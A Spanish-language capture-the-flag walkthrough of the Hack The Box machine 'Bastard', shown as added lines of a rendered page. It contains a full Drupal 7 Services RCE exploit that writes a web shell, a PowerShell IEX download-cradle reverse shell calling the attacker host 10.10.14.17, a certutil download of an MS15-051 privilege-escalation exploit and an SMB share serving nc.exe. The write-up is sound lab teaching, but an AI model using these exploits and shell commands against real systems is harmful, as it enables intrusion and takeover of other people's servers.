+<span class="nb">unset</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">signature_format</span><span class="p">);</span>
+
+<span class="nx">store</span><span class="p">(</span><span class="s1">'user'</span><span class="p">,</span> <span class="nv">$user</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$cache</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nx">e</span><span class="p">(</span><span class="s2">"Unable to obtains endpoint's cache value"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nx">x</span><span class="p">(</span><span class="s2">"Cache contains "</span> <span class="o">.</span> <span class="nb">sizeof</span><span class="p">(</span><span class="nv">$cache</span><span class="p">)</span> <span class="o">.</span> <span class="s2">" entries"</span><span class="p">);</span>
+
+<span class="c1"># Stage 2: Change endpoint's behaviour to write a shell</span>
+
+<span class="kd">class</span> <span class="nc">DrupalCacheArray</span>
+<span class="p">{</span>
+    <span class="c1"># Cache ID</span>
+    <span class="k">protected</span> <span class="nv">$cid</span> <span class="o">=</span> <span class="s2">"services:endpoint_name:resources"</span><span class="p">;</span>
+    <span class="c1"># Name of the table to fetch data from.</span>
+    <span class="c1"># Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()</span>
+    <span class="k">protected</span> <span class="nv">$bin</span> <span class="o">=</span> <span class="s1">'cache'</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$keysToPersist</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">protected</span> <span class="nv">$storage</span> <span class="o">=</span> <span class="p">[];</span>
+
+    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$storage</span><span class="p">,</span> <span class="nv">$endpoint</span><span class="p">,</span> <span class="nv">$controller</span><span class="p">,</span> <span class="nv">$action</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$settings</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="s1">'services'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'resource_api_version'</span> <span class="o">=&gt;</span> <span class="s1">'1.0'</span><span class="p">]</span>
+        <span class="p">];</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cid</span> <span class="o">=</span> <span class="s2">"services:</span><span class="nv">$endpoint</span><span class="s2">:resources"</span><span class="p">;</span>
+
+        <span class="c1"># If no endpoint is given, just reset the original values</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$controller</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="nv">$storage</span><span class="p">[</span><span class="nv">$controller</span><span class="p">][</span><span class="s1">'actions'</span><span class="p">][</span><span class="nv">$action</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
+                <span class="s1">'help'</span> <span class="o">=&gt;</span> <span class="s1">'Writes data to a file'</span><span class="p">,</span>
+                <span class="c1"># Callback function</span>
+                <span class="s1">'callback'</span> <span class="o">=&gt;</span> <span class="s1">'file_put_contents'</span><span class="p">,</span>
+                <span class="c1"># This one does not accept "true" as Drupal does,</span>
+                <span class="c1"># so we just go for a tautology</span>
+                <span class="s1">'access callback'</span> <span class="o">=&gt;</span> <span class="s1">'is_string'</span><span class="p">,</span>
+                <span class="s1">'access arguments'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'a string'</span><span class="p">],</span>
+                <span class="c1"># Arguments given through POST</span>
+                <span class="s1">'args'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'filename'</span><span class="p">,</span>
+                        <span class="s1">'type'</span> <span class="o">=&gt;</span> <span class="s1">'string'</span><span class="p">,</span>
+                        <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'Path to the file'</span><span class="p">,</span>
+                        <span class="s1">'source'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="s1">'filename'</span><span class="p">],</span>
+                        <span class="s1">'optional'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span>
+                    <span class="p">],</span>
+                    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'data'</span><span class="p">,</span>
+                        <span class="s1">'type'</span> <span class="o">=&gt;</span> <span class="s1">'string'</span><span class="p">,</span>
+                        <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'The data to write'</span><span class="p">,</span>
+                        <span class="s1">'source'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="s1">'data'</span><span class="p">],</span>
+                        <span class="s1">'optional'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span>
+                    <span class="p">],</span>
+                <span class="p">],</span>
+                <span class="s1">'file'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                    <span class="s1">'type'</span> <span class="o">=&gt;</span> <span class="s1">'inc'</span><span class="p">,</span>
+                    <span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="s1">'services'</span><span class="p">,</span>
+                    <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'resources/user_resource'</span><span class="p">,</span>
+                <span class="p">],</span>
+                <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="nv">$settings</span>
+            <span class="p">];</span>
+            <span class="nv">$storage</span><span class="p">[</span><span class="nv">$controller</span><span class="p">][</span><span class="s1">'endpoint'</span><span class="p">][</span><span class="s1">'actions'</span><span class="p">]</span> <span class="o">+=</span> <span class="p">[</span>
+                <span class="nv">$action</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                    <span class="s1">'enabled'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
+                    <span class="s1">'settings'</span> <span class="o">=&gt;</span> <span class="nv">$settings</span>
+                <span class="p">]</span>
+            <span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">storage</span> <span class="o">=</span> <span class="nv">$storage</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keysToPersist</span> <span class="o">=</span> <span class="nb">array_fill_keys</span><span class="p">(</span><span class="nb">array_keys</span><span class="p">(</span><span class="nv">$storage</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">ThemeRegistry</span> <span class="nx">Extends</span> <span class="nx">DrupalCacheArray</span> <span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$persistable</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$completeRegistry</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">cache_poison</span><span class="p">(</span><span class="nv">$endpoint</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">);</span>
+
+<span class="c1"># Write the file</span>
+<span class="nv">$json</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$browser</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="nx">TYPE_JSON</span><span class="p">,</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
+
+
+<span class="c1"># Stage 3: Restore endpoint's behaviour</span>
+
+<span class="nx">cache_reset</span><span class="p">(</span><span class="nv">$endpoint</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$json</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])))</span>
+<span class="p">{</span>
+    <span class="nx">e</span><span class="p">(</span><span class="s2">"Failed to write file."</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$file_url</span> <span class="o">=</span> <span class="nv">$url</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+<span class="nx">x</span><span class="p">(</span><span class="s2">"File written: </span><span class="nv">$file_url</span><span class="s2">"</span><span class="p">);</span>
+
+
+<span class="c1"># HTTP Browser</span>
+
+<span class="kd">class</span> <span class="nc">Browser</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$url</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$controller</span> <span class="o">=</span> <span class="nx">CONTROLLER</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$action</span> <span class="o">=</span> <span class="nx">ACTION</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">post</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$headers</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="s2">"Accept: "</span> <span class="o">.</span> <span class="nx">TYPE_JSON</span><span class="p">,</span>
+            <span class="s2">"Content-Type: </span><span class="nv">$type</span><span class="s2">"</span><span class="p">,</span>
+            <span class="s2">"Content-Length: "</span> <span class="o">.</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+        <span class="p">];</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">controller</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">;</span>
+
+        <span class="nv">$s</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span> 
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+        <span class="nv">$error</span> <span class="o">=</span> <span class="nb">curl_error</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+        <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nv">$error</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">e</span><span class="p">(</span><span class="s2">"cURL: </span><span class="nv">$error</span><span class="s2">"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># Cache</span>
+
+<span class="k">function</span> <span class="nf">cache_poison</span><span class="p">(</span><span class="nv">$endpoint</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$tr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ThemeRegistry</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="nv">$endpoint</span><span class="p">,</span> <span class="nx">CONTROLLER</span><span class="p">,</span> <span class="nx">ACTION</span><span class="p">);</span>
+    <span class="nx">cache_edit</span><span class="p">(</span><span class="nv">$tr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">cache_reset</span><span class="p">(</span><span class="nv">$endpoint</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$tr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ThemeRegistry</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="nv">$endpoint</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+    <span class="nx">cache_edit</span><span class="p">(</span><span class="nv">$tr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">cache_edit</span><span class="p">(</span><span class="nv">$tr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$browser</span><span class="p">;</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">([</span><span class="nv">$tr</span><span class="p">]);</span>
+    <span class="nv">$json</span> <span class="o">=</span> <span class="nv">$browser</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="nx">TYPE_PHP</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1"># Utils</span>
+
+<span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$message</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="nv">$message</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$message</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nx">x</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">store</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$name</span><span class="s2">.json"</span><span class="p">;</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">));</span>
+    <span class="nx">x</span><span class="p">(</span><span class="s2">"Stored </span><span class="nv">$name</span><span class="s2"> information in </span><span class="nv">$filename</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Ahora si, procedemos a ejecutar el exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ php drupal_rce.php
+<span class="c"># Exploit Title: Drupal 7.x Services Module Remote Code Execution</span>
+<span class="c"># Vendor Homepage: https://www.drupal.org/project/services</span>
+<span class="c"># Exploit Author: Charles FOL</span>
+<span class="c"># Contact: https://twitter.com/ambionics </span>
+<span class="c"># Website: https://www.ambionics.io/blog/drupal-services-module-rce</span>
+
+
+<span class="c">#!/usr/bin/php</span>
+Stored session information <span class="k">in </span>session.json
+Stored user information <span class="k">in </span>user.json
+Cache contains 7 entries
+File written: http://10.10.10.9//k4miyo.php
+</code></pre></div></div>
+
+<p>Si accedemos al recurso que nos indica <code class="language-plaintext highlighter-rouge">http://10.10.10.9//k4miyo.php</code> y validamos que tenemos ejecución de comandos con nuestra variable <code class="language-plaintext highlighter-rouge">cmd</code>:</p>
+
+<p><img src="/assets/images/htb-bastard/bastard-cmd.png" alt="" /></p>
+
+<p>Una vez teniendo ejecución de comandos, ahora si nos entablamos una reverse shell; por lo tanto, nos copiamos el archivo <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> a nuestro directorio de trabajo y al final del archivo agregamos al siguiente linea <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 443</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor HTTP con python y nos ponemos en escucha a través del puerto 443. Una vez con esto, ejecutamos al siguiente linea (<strong>Nota</strong>: Utilizando powershell desde la parte nativa del sistema `
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe` para evitar problemas debido que nos encontremos un proceso diferente al soportado por el sistema operativo).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.9//k4miyo.php?cmd<span class="o">=</span>C:<span class="se">\W</span>indows<span class="se">\S</span>ysNative<span class="se">\W</span>indowsPowershell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.17/PS.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.9 - - <span class="o">[</span>08/Oct/2021 00:54:16] <span class="s2">"GET /PS.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.9] 49180
+Windows PowerShell running as user BASTARD<span class="nv">$ </span>on BASTARD
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>nt authority<span class="se">\i</span>usr
+PS C:<span class="se">\i</span>netpub<span class="se">\d</span>rupal-7.54&gt;
+</code></pre></div></div>
+
+<p>A este punto ya podemos visualizar la flag (user.txt). Nos queda escalar privilegios, por lo que para esta ocación, ocuparemos la herramienta <a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a>, así que nos la descargamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/rasta-mouse/Sherlock
+Clonando en <span class="s1">'Sherlock'</span>...
+remote: Enumerating objects: 75, <span class="k">done</span><span class="nb">.</span>
+remote: Total 75 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 75
+Recibiendo objetos: 100% <span class="o">(</span>75/75<span class="o">)</span>, 33.97 KiB | 552.00 KiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>39/39<span class="o">)</span>, listo.
+</code></pre></div></div>
+
+<p>Abrimos el archivo <code class="language-plaintext highlighter-rouge">Sherlock.ps1</code> y al final de todo, agregamos la siguiente linea <code class="language-plaintext highlighter-rouge">Find-AllVulns</code>. Ahora si estamos listos para hacer enumeración del sistema. Nos compartimos un servidor HTTP con python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.9 - - <span class="o">[</span>08/Oct/2021 01:09:37] <span class="s2">"GET /Sherlock.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>Ejecutamos la siguiente linea en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.17/Sherlock.ps1'</span><span class="o">)</span>
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Esperamos un poco a que la herramienta haga su trabajo y nos reporte la información.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Title      : User Mode to Ring <span class="o">(</span>KiTrap0D<span class="o">)</span>
+MSBulletin : MS10-015                                           
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems           
+                                
+Title      : Task Scheduler .XML 
+MSBulletin : MS10-092                                           
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Appears Vulnerable                                 
+                                                                
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053                                           
+CVEID      : 2013-1300
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems           
+                                
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081                                           
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems                                                                                     
+                                
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113                                          
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+          
+Title      : ClientCopyImage Win32k 
+MSBulletin : MS15-051      
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Appears Vulnerable
+                                
+Title      : Font Driver Buffer Overflow                                           
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+Title      : <span class="s1">'mrxdav.sys'</span> WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+             6-034?
+VulnStatus : Not Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+             ample-Exploits/MS16-135
+VulnStatus : Not Vulnerable
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+             tml
+VulnStatus : Not Vulnerable
+
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>De acuerdo con los resultados observamos, tenemos las siguientes posibles vulnerabilidades para escalar privilegios:</p>
+
+<ul>
+  <li>Task Scheduler .XML - MS10-092</li>
+  <li>ClientCopyImage Win32k - MS15-051</li>
+  <li>Secondary Logon Handle - MS16-032</li>
+</ul>
+
+<p>Para este caso, vamos a utilizar <strong><em>ClientCopyImage Win32k - MS15-051</em></strong>; asi que vamos a descargar el exploit correspondiente al <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip">MS15-051</a>; lo descomprimimos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip MS15-051-KB3045171.zip
+Archive:  MS15-051-KB3045171.zip
+   creating: MS15-051-KB3045171/
+  inflating: MS15-051-KB3045171/ms15-051.exe  
+  inflating: MS15-051-KB3045171/ms15-051x64.exe  
+   creating: MS15-051-KB3045171/Source/
+   creating: MS15-051-KB3045171/Source/ms15-051/
+  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.cpp  
+  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj  
+  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.filters  
+  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.user  
+  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll.lib  
+  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll64.lib  
+  inflating: MS15-051-KB3045171/Source/ms15-051/ReadMe.txt  
+   creating: MS15-051-KB3045171/Source/ms15-051/Win32/
+  inflating: MS15-051-KB3045171/Source/ms15-051/Win32/ms15-051.exe  
+   creating: MS15-051-KB3045171/Source/ms15-051/x64/
+  inflating: MS15-051-KB3045171/Source/ms15-051/x64/ms15-051x64.exe  
+  inflating: MS15-051-KB3045171/Source/ms15-051.sln  
+  inflating: MS15-051-KB3045171/Source/ms15-051.suo
+</code></pre></div></div>
+
+<p>Y transferimos el archivo <code class="language-plaintext highlighter-rouge">ms15-051x64.exe</code> a la máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.9 - - <span class="o">[</span>08/Oct/2021 01:25:31] <span class="s2">"GET /ms15-051x64.exe HTTP/1.1"</span> 200 -
+10.10.10.9 - - <span class="o">[</span>08/Oct/2021 01:25:32] <span class="s2">"GET /ms15-051x64.exe HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.17/ms15-051x64.exe ms15-051x64.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  d800
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Ahora en nuestra máquina buscamos el archivo <code class="language-plaintext highlighter-rouge">nc.exe</code> y lo ponemos en nuestro directorio de trabajo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate nc.exe
+/usr/share/sqlninja/apps/nc.exe
+❯ <span class="nb">cp</span> /usr/share/sqlninja/apps/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor SMB en nuestra máquina de atacante y damos soporte a la versión 2:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.9,49191<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>BASTARD<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User BASTARD<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Nos ponemos en escucha a través del puerto 443 y procedemos a ejecutar el exploit:</p>
+
